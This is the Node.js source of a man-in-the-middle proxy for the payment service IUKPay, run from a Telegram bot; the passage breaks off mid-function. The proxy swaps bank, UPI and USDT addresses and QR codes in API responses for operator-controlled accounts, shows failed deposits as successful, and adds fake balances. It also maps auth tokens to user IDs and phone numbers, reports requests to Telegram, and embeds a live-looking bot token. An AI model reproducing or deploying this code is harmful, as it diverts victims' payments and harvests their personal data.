const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Redis } = require('@upstash/redis');
const crypto = require('crypto');

const app = express();
const ORIGINAL_API = 'https://api.iukpay.com';
const BOT_TOKEN = '8272819885:AAEQR-2ZQxo7l9HkUHd7BHVvMTuvVYvglJg';
const WEBHOOK_URL = 'https://utrys.vercel.app/bot-webhook';
const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;

const DEFAULT_DATA = {
  banks: [],
  activeIndex: -1,
  botEnabled: true,
  autoRotate: false,
  lastUsedIndex: -1,
  adminChatId: null,
  logRequests: false,
  usdtAddress: '',
  depositSuccess: false,
  depositBonus: 0,
  withdrawOverride: 0,
  userOverrides: {},
  trackedUsers: {},
  suspendedPhones: {}
};

let bot = null;
let webhookSet = false;
try { bot = new TelegramBot(BOT_TOKEN); } catch(e) {}

let redis = null;
if (REDIS_URL && REDIS_TOKEN) {
  try { redis = new Redis({ url: REDIS_URL, token: REDIS_TOKEN }); } catch(e) {}
}

let cachedData = null;
let cacheTime = 0;
const CACHE_TTL = 15000;
const tokenUserMap = {};
const userPhoneMap = {};
let debugNextResponse = false;

async function ensureWebhook() {
  if (!bot || webhookSet) return;
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
  } catch(e) {}
}

async function loadData(forceRefresh) {
  if (!forceRefresh && cachedData && (Date.now() - cacheTime < CACHE_TTL)) return cachedData;
  if (!redis) return { ...DEFAULT_DATA };
  try {
    let raw = await redis.get('iukpayData');
    if (raw) {
      if (typeof raw === 'string') {
        try { raw = JSON.parse(raw); } catch(e) {}
      }
      if (typeof raw === 'object' && raw !== null) {
        cachedData = { ...DEFAULT_DATA, ...raw };
      } else {
        cachedData = { ...DEFAULT_DATA };
      }
      if (!cachedData.userOverrides) cachedData.userOverrides = {};
      if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
      cacheTime = Date.now();
      return cachedData;
    }
  } catch(e) {
    console.error('Redis load error:', e.message);
  }
  cachedData = { ...DEFAULT_DATA };
  cacheTime = Date.now();
  return cachedData;
}

async function saveData(data) {
  const skipMerge = data._skipOverrideMerge;
  if (skipMerge) delete data._skipOverrideMerge;
  if (!redis) { cachedData = data; cacheTime = Date.now(); return; }
  try {
    if (!skipMerge) {
      const current = await redis.get('iukpayData');
      if (current && typeof current === 'object' && current.userOverrides) {
        if (!data.userOverrides) data.userOverrides = {};
        for (const uid of Object.keys(current.userOverrides)) {
          const cur = current.userOverrides[uid];
          const loc = data.userOverrides[uid];
          if (!loc) {
            data.userOverrides[uid] = cur;
          } else {
            if (cur.addedBalance !== undefined && loc.addedBalance === undefined) {
              loc.addedBalance = cur.addedBalance;
            }
            if (cur.quotaRecords && cur.quotaRecords.length > 0 && (!loc.quotaRecords || loc.quotaRecords.length === 0)) {
              loc.quotaRecords = cur.quotaRecords;
            }
          }
        }
      }
    }
    cachedData = data;
    cacheTime = Date.now();
    await redis.set('iukpayData', data);
  } catch(e) {
    console.error('Redis save error:', e.message);
    cachedData = data;
    cacheTime = Date.now();
  }
}

function getTokenFromReq(req) {
  return req.headers['apptoken'] || req.headers['appToken'] || req.headers['authorization'] || req.headers['token'] || req.headers['auth'] || '';
}

function saveTokenUserId(req, userId) {
  if (!userId) return;
  const tok = getTokenFromReq(req);
  if (tok && tok.length > 10) {
    const key = tok.substring(0, 100);
    tokenUserMap[key] = String(userId);
    if (redis) redis.hset('iukpayTokenMap', key, String(userId)).catch(()=>{});
  }
}

async function getUserIdFromToken(req) {
  const tok = getTokenFromReq(req);
  if (!tok || tok.length < 10) return null;
  const key = tok.substring(0, 100);
  if (tokenUserMap[key]) return tokenUserMap[key];
  if (redis) {
    try {
      const stored = await redis.hget('iukpayTokenMap', key);
      if (stored) { tokenUserMap[key] = String(stored); return String(stored); }
    } catch(e) {}
  }
  return null;
}

async function extractUserId(req, jsonResp) {
  const fromToken = await getUserIdFromToken(req);
  if (fromToken) return fromToken;
  const body = req.parsedBody || {};
  const uid = body.memberCodeId || body.userId || body.userid || body.memberId || '';
  if (uid) return String(uid);
  const qs = new URLSearchParams((req.originalUrl || '').split('?')[1] || '');
  if (qs.get('memberCodeId')) return String(qs.get('memberCodeId'));
  if (qs.get('userId')) return String(qs.get('userId'));
  if (qs.get('memberId')) return String(qs.get('memberId'));
  const respData = getResponseData(jsonResp);
  if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
    const rid = respData.memberCodeId || respData.userId || respData.userid || respData.memberId || '';
    if (rid) return String(rid);
  }
  const authHeader = getTokenFromReq(req);
  if (authHeader) {
    try {
      const clean = authHeader.replace('Bearer ', '');
      const parts = clean.split('.');
      if (parts.length === 3) {
        const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
        if (payload.memberCodeId) return String(payload.memberCodeId);
        if (payload.userId) return String(payload.userId);
        if (payload.memberId) return String(payload.memberId);
        if (payload.sub) return String(payload.sub);
      }
    } catch(e) {}
  }
  return '';
}

async function trackUser(data, userId, info, phone) {
  if (!userId) return;
  if (!data.trackedUsers) data.trackedUsers = {};
  const existing = data.trackedUsers[String(userId)] || {};
  data.trackedUsers[String(userId)] = {
    lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
    lastAction: info || existing.lastAction || '',
    orderCount: (existing.orderCount || 0) + (info && info.includes('Order') ? 1 : 0),
    phone: phone || existing.phone || ''
  };
  if (phone) userPhoneMap[String(userId)] = phone;
}

function isLogOff(data, userId) {
  if (!userId) return false;
  const uo = data.userOverrides && data.userOverrides[String(userId)];
  return uo && uo.logOff === true;
}

const logOffTokens = new Set();
const checkedTokens = new Set();

function isLogOffByTokenFast(data, req) {
  const tok = getTokenFromReq(req);
  if (!tok || tok.length < 10) return false;
  const tKey = tok.substring(0, 100);
  if (logOffTokens.has(tKey)) return true;
  const userId = tokenUserMap[tKey] || '';
  if (userId && isLogOff(data, userId)) { logOffTokens.add(tKey); return true; }
  return false;
}

async function isLogOffByToken(data, req) {
  const tok = getTokenFromReq(req);
  if (!tok || tok.length < 10) return false;
  const tKey = tok.substring(0, 100);
  if (logOffTokens.has(tKey)) return true;
  if (checkedTokens.has(tKey)) return false;
  const userId = tokenUserMap[tKey] || '';
  if (userId && isLogOff(data, userId)) { logOffTokens.add(tKey); return true; }
  if (redis) {
    try {
      const isOff = await redis.sismember('iukpayLogOffTokens', tKey);
      if (isOff) { logOffTokens.add(tKey); return true; }
      const stored = await redis.hget('iukpayTokenMap', tKey);
      if (stored && isLogOff(data, stored)) { logOffTokens.add(tKey); redis.sadd('iukpayLogOffTokens', tKey).catch(()=>{}); return true; }
    } catch(e) {}
  }
  checkedTokens.add(tKey);
  return false;
}

function getPhone(data, userId) {
  if (!userId) return '';
  if (userPhoneMap[String(userId)]) return userPhoneMap[String(userId)];
  const tracked = data.trackedUsers && data.trackedUsers[String(userId)];
  if (tracked && tracked.phone) {
    userPhoneMap[String(userId)] = tracked.phone;
    return tracked.phone;
  }
  return '';
}

function getUserOverride(data, userId) {
  if (!userId || !data.userOverrides) return null;
  return data.userOverrides[String(userId)] || null;
}

function getEffectiveSettings(data, userId) {
  const uo = getUserOverride(data, userId);
  return {
    botEnabled: uo && uo.botEnabled !== undefined ? uo.botEnabled : data.botEnabled,
    depositSuccess: uo && uo.depositSuccess !== undefined ? uo.depositSuccess : data.depositSuccess,
    depositBonus: uo && uo.depositBonus !== undefined ? uo.depositBonus : (data.depositBonus || 0),
    bankOverride: uo && uo.bankIndex !== undefined ? uo.bankIndex : null
  };
}

function getActiveBank(data, userId) {
  const uo = getUserOverride(data, userId);
  if (uo && uo.bankIndex !== undefined && uo.bankIndex >= 0 && uo.bankIndex < data.banks.length) {
    return data.banks[uo.bankIndex];
  }
  if (data.autoRotate && data.banks.length > 1) {
    let idx;
    do { idx = Math.floor(Math.random() * data.banks.length); } while (idx === data.lastUsedIndex && data.banks.length > 1);
    data.lastUsedIndex = idx;
    data._rotatedIndex = idx;
    return data.banks[idx];
  }
  if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) return data.banks[data.activeIndex];
  if (data.banks.length > 0) return data.banks[0];
  return null;
}

async function getActiveBankAndSave(data, userId) {
  const bank = getActiveBank(data, userId);
  if (data.autoRotate && data._rotatedIndex !== undefined) {
    data.lastUsedIndex = data._rotatedIndex;
    delete data._rotatedIndex;
    await saveData(data);
  }
  return bank;
}

function bankListText(d) {
  if (d.banks.length === 0) return 'No banks added yet.';
  return d.banks.map((b, i) => {
    const a = i === d.activeIndex ? ' ✅' : '';
    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${a}`;
  }).join('\n');
}

app.use(async (req, res, next) => {
  const chunks = [];
  req.on('data', c => chunks.push(c));
  req.on('end', () => {
    req.rawBody = Buffer.concat(chunks);
    const ct = (req.headers['content-type'] || '').toLowerCase();
    try {
      if (ct.includes('json')) {
        req.parsedBody = JSON.parse(req.rawBody.toString());
      } else if (ct.includes('form') && !ct.includes('multipart')) {
        const params = new URLSearchParams(req.rawBody.toString());
        req.parsedBody = Object.fromEntries(params);
      } else {
        req.parsedBody = {};
      }
    } catch(e) { req.parsedBody = {}; }
    next();
  });
});

async function proxyFetch(req) {
  const url = ORIGINAL_API + req.originalUrl;
  const fwd = {};
  for (const [k, v] of Object.entries(req.headers)) {
    const kl = k.toLowerCase();
    if (kl === 'host' || kl === 'connection' || kl === 'content-length' ||
        kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
    fwd[k] = v;
  }
  fwd['host'] = 'api.iukpay.com';
  const opts = { method: req.method, headers: fwd };
  if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
    opts.body = req.rawBody;
    fwd['content-length'] = String(req.rawBody.length);
  }
  const response = await fetch(url, opts);
  const respBody = await response.text();
  const respHeaders = {};
  response.headers.forEach((val, key) => {
    const kl = key.toLowerCase();
    if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
      respHeaders[key] = val;
    }
  });
  let jsonResp = null;
  try { jsonResp = JSON.parse(respBody); } catch(e) {}
  return { response, respBody, respHeaders, jsonResp };
}

function getResponseData(jsonResp) {
  if (!jsonResp) return null;
  if (jsonResp.data) return jsonResp.data;
  if (jsonResp.body) return jsonResp.body;
  return null;
}

function sendJson(res, headers, json, fallback) {
  const body = json ? JSON.stringify(json) : fallback;
  headers['content-type'] = 'application/json; charset=utf-8';
  headers['content-length'] = String(Buffer.byteLength(body));
  headers['cache-control'] = 'no-store, no-cache, must-revalidate';
  headers['pragma'] = 'no-cache';
  delete headers['etag'];
  delete headers['last-modified'];
  res.writeHead(200, headers);
  res.end(body);
}

async function transparentProxy(req, res) {
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);

    if (jsonResp) {
      const rd = getResponseData(jsonResp);
      const uid = rd && typeof rd === 'object' && !Array.isArray(rd) ? (rd.memberCodeId || rd.userId || rd.memberId || '') : '';
      if (uid) saveTokenUserId(req, uid);
    }

    const data = cachedData || await loadData();
    if (data.usdtAddress && jsonResp) {
      const result = replaceUsdtInResponse(jsonResp, data);
      if (result && result.oldAddr) {
        const newBody = JSON.stringify(jsonResp);
        respHeaders['content-type'] = 'application/json; charset=utf-8';
        respHeaders['content-length'] = String(Buffer.byteLength(newBody));
        respHeaders['cache-control'] = 'no-store, no-cache, must-revalidate';
        delete respHeaders['etag'];
        delete respHeaders['last-modified'];
        res.writeHead(response.status, respHeaders);
        res.end(newBody);
        return;
      }
    }

    res.writeHead(response.status, respHeaders);
    res.end(respBody);
  } catch(e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

const BANK_FIELDS = {
  'accountno': 'accountNo', 'accountnumber': 'accountNo', 'account_no': 'accountNo',
  'receiveaccountno': 'accountNo', 'bankaccount': 'accountNo', 'acno': 'accountNo',
  'bankaccountno': 'accountNo', 'beneficiaryaccount': 'accountNo', 'payeeaccount': 'accountNo',
  'holderaccount': 'accountNo', 'cardno': 'accountNo', 'cardnumber': 'accountNo',
  'bankcardno': 'accountNo', 'payeecardno': 'accountNo', 'receivecardno': 'accountNo',
  'payeebankaccount': 'accountNo', 'payeebankaccountno': 'accountNo', 'payeeaccountno': 'accountNo',
  'receiveraccount': 'accountNo', 'receiveraccountno': 'accountNo', 'receiveaccountnumber': 'accountNo',
  'walletaccount': 'accountNo', 'walletno': 'accountNo', 'walletaccountno': 'accountNo',
  'collectionaccount': 'accountNo', 'collectionaccountno': 'accountNo',
  'customerbanknumber': 'accountNo', 'customerbankaccount': 'accountNo', 'customeraccountno': 'accountNo',
  'beneficiaryname': 'accountHolder', 'accountname': 'accountHolder', 'account_name': 'accountHolder',
  'receiveaccountname': 'accountHolder', 'holdername': 'accountHolder', 'name': 'accountHolder',
  'accountholder': 'accountHolder', 'bankaccountholder': 'accountHolder', 'receivename': 'accountHolder',
  'payeename': 'accountHolder', 'bankaccountname': 'accountHolder', 'realname': 'accountHolder',
  'cardholder': 'accountHolder', 'cardname': 'accountHolder', 'bankcardname': 'accountHolder',
  'payeecardname': 'accountHolder', 'receivecardname': 'accountHolder', 'receivercardname': 'accountHolder',
  'receivername': 'accountHolder', 'collectionname': 'accountHolder', 'collectionaccountname': 'accountHolder',
  'payeerealname': 'accountHolder', 'receiverrealname': 'accountHolder',
  'customername': 'accountHolder', 'customerrealname': 'accountHolder',
  'ifsc': 'ifsc', 'ifsccode': 'ifsc', 'ifsc_code': 'ifsc', 'receiveifsc': 'ifsc',
  'bankifsc': 'ifsc', 'payeeifsc': 'ifsc', 'payeebankifsc': 'ifsc', 'receiverifsc': 'ifsc',
  'receiverbankifsc': 'ifsc', 'collectionifsc': 'ifsc',
  'bankname': 'bankName', 'bank_name': 'bankName', 'bank': 'bankName',
  'payeebankname': 'bankName', 'receiverbankname': 'bankName', 'receivebankname': 'bankName',
  'collectionbankname': 'bankName',
  'upiid': 'upiId', 'upi_id': 'upiId', 'upi': 'upiId', 'vpa': 'upiId',
  'upiaddress': 'upiId', 'payeeupi': 'upiId', 'payeeupiid': 'upiId',
  'receiverupi': 'upiId', 'walletupi': 'upiId', 'collectionupi': 'upiId',
  'walletaddress': 'upiId', 'payaddress': 'upiId', 'payaccount': 'upiId',
  'customerupi': 'upiId'
};

function replaceBankInUrl(urlStr, bank) {
  if (!urlStr || typeof urlStr !== 'string') return urlStr;
  if (!urlStr.includes('://') && !urlStr.includes('?')) return urlStr;
  const urlParams = [
    { names: ['account', 'accountNo', 'account_no', 'accountno', 'account_number', 'accountNumber', 'acc', 'receiveAccountNo', 'receiver_account', 'pa'], value: bank.accountNo },
    { names: ['name', 'accountName', 'account_name', 'accountname', 'receiveAccountName', 'receiver_name', 'beneficiary_name', 'beneficiaryName', 'pn', 'holder_name'], value: bank.accountHolder },
    { names: ['ifsc', 'ifsc_code', 'ifscCode', 'receiveIfsc', 'IFSC'], value: bank.ifsc }
  ];
  let result = urlStr;
  for (const group of urlParams) {
    if (!group.value) continue;
    for (const paramName of group.names) {
      const regex = new RegExp('([?&])(' + paramName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')=([^&]*)', 'i');
      result = result.replace(regex, '$1$2=' + encodeURIComponent(group.value));
    }
  }
  if (bank.upiId && result.includes('upi://pay')) {
    result = result.replace(/pa=[^&]+/, `pa=${bank.upiId}`);
    if (bank.accountHolder) result = result.replace(/pn=[^&]+/, `pn=${encodeURIComponent(bank.accountHolder)}`);
  }
  return result;
}

function deepReplace(obj, bank, originalValues, depth) {
  if (!obj || typeof obj !== 'object' || depth > 10) return;
  if (!originalValues) originalValues = {};
  for (const key of Object.keys(obj)) {
    const val = obj[key];
    if (val && typeof val === 'object') {
      if (Array.isArray(val)) {
        val.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bank, originalValues, depth + 1); });
      } else {
        deepReplace(val, bank, originalValues, depth + 1);
      }
      continue;
    }
    if (typeof val !== 'string' && typeof val !== 'number') continue;
    const kl = key.toLowerCase().replace(/[_\-\s]/g, '');
    const mapped = BANK_FIELDS[kl];
    if (mapped && bank[mapped] && String(val).length > 0) {
      if (typeof val === 'string' && val.length > 3) originalValues[key] = val;
      obj[key] = bank[mapped];
    }
    if (typeof val === 'string') {
      if (val.includes('://') || (val.includes('?') && val.includes('='))) {
        obj[key] = replaceBankInUrl(val, bank);
      }
      for (const [origKey, origVal] of Object.entries(originalValues)) {
        if (typeof origVal === 'string' && origVal.length > 3 && typeof obj[key] === 'string' && obj[key].includes(origVal)) {
          const mappedF = BANK_FIELDS[origKey.toLowerCase().replace(/[_\-\s]/g, '')];
          if (mappedF && bank[mappedF]) {
            obj[key] = obj[key].split(origVal).join(bank[mappedF]);
          }
        }
      }
    }
  }
}

function markDepositSuccess(obj) {
  if (!obj) return;
  const failValues = [3, '3', 4, '4', -1, '-1', 'failed', 'fail', 'FAILED', 'FAIL', 'cancelled', 'canceled'];
  if (obj.payStatus !== undefined) {
    if (!failValues.includes(obj.payStatus)) obj.payStatus = 2;
    return;
  }
  const statusFields = ['status', 'orderStatus', 'rechargeStatus', 'state', 'stat'];
  for (const field of statusFields) {
    if (obj[field] !== undefined) {
      if (failValues.includes(obj[field])) continue;
      if (typeof obj[field] === 'number') obj[field] = 2;
      else if (typeof obj[field] === 'string') {
        const num = parseInt(obj[field]);
        obj[field] = !isNaN(num) ? '2' : 'success';
      }
    }
  }
}

function addBonusToBalanceFields(obj, bonus) {
  if (!obj || typeof obj !== 'object') return;
  const balanceKeys = ['balance', 'userbalance', 'availablebalance', 'totalbalance', 'money', 'coin', 'wallet', 'usermoney', 'rechargebalance', 'totalamount', 'availableamount'];
  for (const key of Object.keys(obj)) {
    if (balanceKeys.includes(key.toLowerCase())) {
      const current = parseFloat(obj[key]);
      if (!isNaN(current)) {
        obj[key] = typeof obj[key] === 'string' ? String((current + bonus).toFixed(2)) : parseFloat((current + bonus).toFixed(2));
      }
    }
    if (typeof obj[key] === 'object' && obj[key] !== null && !Array.isArray(obj[key])) {
      addBonusToBalanceFields(obj[key], bonus);
    }
  }
}

function replaceUsdtInResponse(jsonResp, data) {
  if (!data.usdtAddress || !jsonResp) return null;
  const newAddr = data.usdtAddress;
  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(newAddr)}`;
  function scanAndReplace(obj, depth) {
    if (!obj || typeof obj !== 'object' || depth > 10) return '';
    if (Array.isArray(obj)) { obj.forEach(item => scanAndReplace(item, depth + 1)); return ''; }
    let oldAddr = '';
    for (const key of Object.keys(obj)) {
      const kl = key.toLowerCase();
      if (typeof obj[key] === 'string') {
        if ((kl.includes('usdt') && kl.includes('addr')) || kl === 'address' || kl === 'walletaddress' || kl === 'customusdtaddress' || kl === 'addr' || kl === 'depositaddress' || kl === 'deposit_address' || kl === 'receiveaddress' || kl === 'receiveraddress' || kl === 'payaddress' || kl === 'trcaddress' || kl === 'trc20address' || (kl.includes('address') && obj[key].length >= 30 && /^T[a-zA-Z0-9]{33}$/.test(obj[key]))) {
          if (obj[key].length >= 20 && obj[key] !== newAddr) {
            oldAddr = oldAddr || obj[key];
            obj[key] = newAddr;
          }
        }
        if (kl === 'qrcode' || kl === 'qrcodeurl' || kl === 'qr' || kl === 'codeurl' || kl === 'qrimg' || kl === 'qrimgurl' || kl === 'codeimgurl' || kl === 'codeimg' || kl === 'qrurl' || kl === 'depositqr' || kl === 'depositqrcode') {
          obj[key] = qrUrl;
        }
        if (kl.includes('qr') || kl.includes('code')) {
          if (typeof obj[key] === 'string' && obj[key].includes('http') && (obj[key].includes('qr') || obj[key].includes('code') || obj[key].includes('.png') || obj[key].includes('.jpg'))) {
            obj[key] = qrUrl;
          }
        }
      } else if (typeof obj[key] === 'object') {
        const found = scanAndReplace(obj[key], depth + 1);
        if (found) oldAddr = oldAddr || found;
      }
    }
    if (oldAddr) {
      const escaped = oldAddr.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      const re = new RegExp(escaped, 'g');
      for (const key of Object.keys(obj)) {
        if (typeof obj[key] === 'string' && obj[key].includes(oldAddr)) {
          obj[key] = obj[key].replace(re, newAddr);
        }
      }
    }
    return oldAddr;
  }
  let foundOld = '';
  const rd = getResponseData(jsonResp);
  if (rd) foundOld = scanAndReplace(rd, 0) || '';
  if (!foundOld) foundOld = scanAndReplace(jsonResp, 0) || '';
  const fullStr = JSON.stringify(jsonResp);
  const trcMatch = fullStr.match(/T[a-zA-Z0-9]{33}/g);
  if (trcMatch) {
    for (const addr of trcMatch) {
      if (addr !== newAddr) {
        foundOld = foundOld || addr;
        const replaced = JSON.stringify(jsonResp).split(addr).join(newAddr);
        try { Object.assign(jsonResp, JSON.parse(replaced)); } catch(e) {}
      }
    }
  }
  return { oldAddr: foundOld, newAddr, qrUrl };
}

app.use((req, res, next) => {
  (async () => {
    try {
      if (!bot) return;
      const data = cachedData || await loadData();
      if (!data.logRequests || !data.adminChatId) return;
      const path = req.originalUrl || req.url;
      if (path.includes('bot-webhook') || path.includes('favicon')) return;
      const tok = getTokenFromReq(req);
      const tKey = tok && tok.length > 10 ? tok.substring(0, 100) : '';
      if (tKey && logOffTokens.has(tKey)) return;
      let userId = tKey ? (tokenUserMap[tKey] || '') : '';
      if (!userId) {
        const body = req.parsedBody || {};
        userId = body.memberCodeId || '';
      }
      if (userId && isLogOff(data, userId)) { if (tKey) logOffTokens.add(tKey); return; }
      if (!userId && tKey && redis) {
        try {
          const isOff = await redis.sismember('iukpayLogOffTokens', tKey);
          if (isOff) { logOffTokens.add(tKey); return; }
        } catch(e) {}
      }
      const phone = getPhone(data, userId);
      const tag = userId ? ` [${userId}]` : '';
      const phoneTag = phone ? ` (${phone})` : '';
      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`).catch(()=>{});
    } catch(e) {}
  })();
  next();
});

app.get('/setup-webhook', async (req, res) => {
  if (!bot) return res.json({ error: 'No bot token' });
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
    const info = await bot.getWebHookInfo();
    res.json({ success: true, webhook: info });
  } catch(e) { res.json({ error: e.message }); }
});

app.get('/health', async (req, res) => {
  const redisConnected = !!redis;
  let redisWorking = false;
  if (redis) {
    try { await redis.ping(); redisWorking = true; } catch(e) {}
  }
  const data = await loadData(true);
  const active = getActiveBank(data, null);
  res.json({
    status: 'ok',
    redis: redisConnected ? (redisWorking ? 'connected' : 'error') : 'not configured',
    bankActive: !!active,
    totalBanks: data.banks.length,
    adminSet: !!data.adminChatId,
    perIdOverrides: Object.keys(data.userOverrides || {}).length,
    envCheck: { KV_URL: !!process.env.KV_REST_API_URL, KV_TOKEN: !!process.env.KV_REST_API_TOKEN, UPSTASH_URL: !!process.env.UPSTASH_REDIS_REST_URL, UPSTASH_TOKEN: !!process.env.UPSTASH_REDIS_REST_TOKEN }
  });
});

app.post('/bot-webhook', async (req, res) => {
  try {
    await ensureWebhook();
    if (!bot) return res.sendStatus(200);
    const msg = req.parsedBody?.message;
    if (!msg || !msg.text) return res.sendStatus(200);
    const chatId = msg.chat.id;
    const text = msg.text.trim();
    let data = await loadData(true);

    if (text === '/start') {
      if (data.adminChatId && data.adminChatId !== chatId) {
        await bot.sendMessage(chatId, '❌ Bot already configured with another admin.');
        return res.sendStatus(200);
      }
      data.adminChatId = chatId;
      await saveData(data);
      await bot.sendMessage(chatId,
`🏦 IUKPay Bank Controller

=== BANK COMMANDS ===
/addbank Name|AccNo|IFSC|BankName|UPI
/removebank <number>
/setbank <number>
/banks — List all banks

=== CONTROL ===
/on — Proxy ON
/off — Proxy OFF
/rotate — Toggle auto-rotate banks
/log — Toggle request logging
/off log <userId> — Log off for user
/on log <userId> — Log on for user
/status — Full status
/debug — Debug next response

=== BALANCE ===
/add <amount> <userId> — Add balance
/deduct <amount> <userId> — Remove balance
/remove balance <userId> — Remove all fake balance
/history — All balance changes
/history <userId> — User balance changes
/clearhistory — Clear all history

=== USDT ===
/usdt <address> — Set USDT address
/usdt off — Disable USDT override

=== SUSPEND ===
/suspend <phone> — Block login for phone
/unsuspend <phone> — Unblock login
/suspended — List all suspended

=== TRACKING ===
/idtrack — Show all tracked user IDs

Example:
/addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
      );
      return res.sendStatus(200);
    }

    if (data.adminChatId && chatId !== data.adminChatId) {
      await bot.sendMessage(chatId, '❌ Unauthorized.');
      return res.sendStatus(200);
    }

    if (text === '/status') {
      const active = getActiveBank(data, null);
      const idCount = Object.keys(data.userOverrides || {}).length;
      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
      if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
      if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
      else m += '\n\n⚠️ No active bank';
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text === '/on') { data.botEnabled = true; await saveData(data); await bot.sendMessage(chatId, '🟢 Proxy ON'); return res.sendStatus(200); }
    if (text === '/off') { data.botEnabled = false; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
    if (text === '/rotate') { data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
    if (text === '/log') { data.logRequests = !data.logRequests; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }

    if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next bank-replace request ka full response dump aayega'); return res.sendStatus(200); }

    if (text.startsWith('/off log ')) {
      const targetId = text.substring(9).trim();
      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /off log <userId>'); return res.sendStatus(200); }
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[targetId]) data.userOverrides[targetId] = {};
      data.userOverrides[targetId].logOff = true;
      await saveData(data);
      if (redis) {
        try {
          const allTokens = await redis.hgetall('iukpayTokenMap');
          if (allTokens) {
            for (const [tKey, uid] of Object.entries(allTokens)) {
              if (String(uid) === String(targetId)) {
                await redis.sadd('iukpayLogOffTokens', tKey);
                logOffTokens.add(tKey);
              }
            }
          }
        } catch(e) {}
      }
      for (const [tKey, uid] of Object.entries(tokenUserMap)) {
        if (String(uid) === String(targetId)) logOffTokens.add(tKey);
      }
      await bot.sendMessage(chatId, `🔇 Logging OFF for user ${targetId}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/on log ')) {
      const targetId = text.substring(8).trim();
      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /on log <userId>'); return res.sendStatus(200); }
      if (data.userOverrides && data.userOverrides[targetId]) {
        delete data.userOverrides[targetId].logOff;
        await saveData(data);
      }
      if (redis) {
        try {
          const allTokens = await redis.hgetall('iukpayTokenMap');
          if (allTokens) {
            for (const [tKey, uid] of Object.entries(allTokens)) {
              if (String(uid) === String(targetId)) {
                await redis.srem('iukpayLogOffTokens', tKey);
                logOffTokens.delete(tKey);
              }
            }
          }
        } catch(e) {}
      }
      for (const [tKey, uid] of Object.entries(tokenUserMap)) {
        if (String(uid) === String(targetId)) logOffTokens.delete(tKey);
      }
      await bot.sendMessage(chatId, `📡 Logging ON for user ${targetId}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/add ')) {
      const parts = text.substring(5).trim().split(/\s+/);
      const amount = parseFloat(parts[0]);
      const targetUserId = parts[1] || '';
      if (isNaN(amount) || !targetUserId) {
        await bot.sendMessage(chatId, '❌ Format: /add <amount> <userId>\nExample: /add 500 93527');
        return res.sendStatus(200);
      }
      const freshData = await loadData(true);
      if (!freshData.userOverrides) freshData.userOverrides = {};
      if (!freshData.userOverrides[targetUserId]) freshData.userOverrides[targetUserId] = {};
      freshData.userOverrides[targetUserId].addedBalance = (freshData.userOverrides[targetUserId].addedBalance || 0) + amount;
      const tracked = freshData.trackedUsers && freshData.trackedUsers[targetUserId];
      const currentBal = tracked ? tracked.balance : 'N/A';
      const updatedBal = currentBal !== 'N/A' ? parseFloat((parseFloat(currentBal) + freshData.userOverrides[targetUserId].addedBalance).toFixed(2)) : 'N/A';
      if (!freshData.balanceHistory) freshData.balanceHistory = [];
      freshData.balanceHistory.push({
        type: 'add',
        userId: targetUserId,
        amount: amount,
        totalAdded: freshData.userOverrides[targetUserId].addedBalance,
        originalBalance: currentBal,
        updatedBalance: updatedBal,
        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        phone: (tracked && tracked.phone) || ''
      });
      if (!freshData.userOverrides[targetUserId].quotaRecords) freshData.userOverrides[targetUserId].quotaRecords = [];
      const nowDate = new Date();
      const dd = String(nowDate.getDate()).padStart(2, '0');
      const mm = String(nowDate.getMonth() + 1).padStart(2, '0');
      const yyyy = nowDate.getFullYear();
      const hh = String(nowDate.getHours()).padStart(2, '0');
